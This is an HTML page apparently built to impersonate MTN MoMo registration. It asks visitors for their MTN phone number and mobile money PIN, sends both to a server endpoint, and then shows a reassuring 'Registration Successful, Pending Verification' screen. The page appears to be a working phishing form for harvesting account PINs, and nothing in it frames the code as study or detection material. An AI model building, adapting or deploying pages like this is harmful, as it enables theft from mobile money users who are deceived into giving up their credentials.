<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Registration</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
        button { background: #ffcc00; color: #000; border: none; padding: 14px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        button:hover { background: #e6b800; }
        .hidden { display: none; }
        .success-icon { font-size: 50px; color: #28a745; margin-bottom: 10px; }
        .error-msg { color: red; font-size: 14px; margin-top: 10px; }
        .pending-badge { background: #fff3cd; color: #856404; padding: 8px 16px; border-radius: 20px; display: inline-block; font-weight: bold; margin: 15px 0; }
        .details { background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; }
        .details div { display: flex; justify-content: space-between; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card" id="form-container">
        <h2>MTN MoMo Registration</h2>
        <input type="tel" id="phone" placeholder="Enter MTN Number" required>
        <input type="password" id="pin" placeholder="Enter 4 or 5 digit PIN" minlength="4" maxlength="5" inputmode="numeric" required>
        <button onclick="submitForm()">Register</button>
        <div id="error" class="error-msg"></div>
    </div>

    <!-- Success Screen (Hidden initially) -->
    <div class="card hidden" id="success-container">
        <div class="success-icon">✔</div>
        <h2 style="color: #28a745;">Registration Successful!</h2>
        <p>Your MTN MoMo registration has been received.</p>
        
        <div class="details">
            <div><strong>Registration ID</strong> <span id="res-id">#----</span></div>
            <div><strong>MTN Number</strong> <span id="res-phone">---</span></div>
        </div>

        <div class="pending-badge">Pending Verification</div>
        <p style="color: #666; font-size: 14px;">You will receive a confirmation SMS shortly.</p>

        <button onclick="resetForm()">Register Another Account</button>
    </div>

    <script>
        async function submitForm() {
            const phone = document.getElementById('phone').value.trim();
            const pin = document.getElementById('pin').value.trim();
            const errorDiv = document.getElementById('error');

            errorDiv.innerText = "";

            // Frontend validation for 4 or 5 digits
            if (pin.length < 4 || pin.length > 5) {
                errorDiv.innerText = "PIN must be exactly 4 or 5 digits.";
                return;
            }

            try {
                const response = await fetch('/api/auth/register', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, pin })
                });

                const data = await response.json();

                if (response.ok) {
                    // Show success screen
                    document.getElementById('form-container').classList.add('hidden');
                    document.getElementById('success-container').classList.remove('hidden');
                    document.getElementById('res-id').innerText = data.registrationId;
                    document.getElementById('res-phone').innerText = data.phone;
                } else {
                    errorDiv.innerText = data.message || "Registration failed.";
                }
            } catch (error) {
                errorDiv.innerText = "Network error. Please try again.";
            }
        }

        function resetForm() {
            document.getElementById('phone').value = "";
            document.getElementById('pin').value = "";
            document.getElementById('success-container').classList.add('hidden');
            document.getElementById('form-container').classList.remove('hidden');
        }
    </script>
</body>
</html>
